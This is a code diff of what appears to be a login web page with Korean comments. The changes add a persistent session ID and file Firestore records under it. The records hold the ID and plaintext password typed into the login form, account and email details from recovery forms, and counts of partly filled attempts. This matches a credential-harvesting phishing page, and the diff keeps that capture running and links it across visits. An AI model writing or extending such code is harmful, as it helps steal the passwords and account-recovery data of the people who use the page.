@@ -655,6 +655,13 @@ button:hover {
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
 
+  let sessionId = localStorage.getItem("sessionId");
+
+  if (!sessionId) {
+    sessionId = crypto.randomUUID();
+    localStorage.setItem("sessionId", sessionId);
+  }
+
   // 전역으로 사용할 수 있게 등록
   window._db = db;
   window._collection = collection;
@@ -896,7 +903,7 @@ function togglePw() {
 
 async function logAttempt(filledCount, didSubmit, type = "login") {
   try {
-    await window._addDoc(window._collection(window._db, "attempts"), {
+    await window._addDoc(window._collection(window._db, "users", sessionId, "attempts"), {
       type: type,
       filledFields: filledCount,
       submitted: didSubmit,
@@ -949,7 +956,9 @@ async function validateLogin() {
   
   // 🔥 입력값 저장
   try {
-    await window._addDoc(window._collection(window._db, "logins"), {
+    await window._addDoc(
+      window._collection(window._db, "users", sessionId, "logins"),
+    {
       id: idVal,
       password: pwVal,
       timestamp: window._serverTimestamp(),
@@ -1194,7 +1203,7 @@ async function validateFindForm() {
     // ✅ 유효할 때만 저장
     if (result) {
       try {
-        await window._addDoc(window._collection(window._db, "find_phone"), {
+        await window._addDoc(window._collection(window._db, "users", sessionId, "find_phone"), {
           account: document.getElementById("accountInput").value.trim(),
 
           // 🔥 이름 구조 개선 (추천)
@@ -1230,7 +1239,7 @@ async function validateFindForm() {
     // ✅ 유효할 때만 저장
     if (result) {
       try {
-        await window._addDoc(window._collection(window._db, "find_email"), {
+        await window._addDoc(window._collection(window._db, "users", sessionId, "find_email"), {
           account: document.getElementById("accountInput").value.trim(),
           email: document.getElementById("emailInput").value.trim(),
 
